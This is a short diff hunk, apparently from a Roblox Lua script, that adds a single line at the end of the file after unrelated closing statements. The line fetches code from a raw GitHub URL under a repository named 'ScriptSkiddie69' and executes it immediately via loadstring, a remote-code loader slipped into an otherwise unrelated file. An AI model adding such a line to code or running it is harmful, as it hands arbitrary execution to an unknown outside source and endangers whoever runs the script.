@@ -191,3 +191,4 @@ end
 end
 end
 })
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptSkiddie69/aa/main/aa'))()
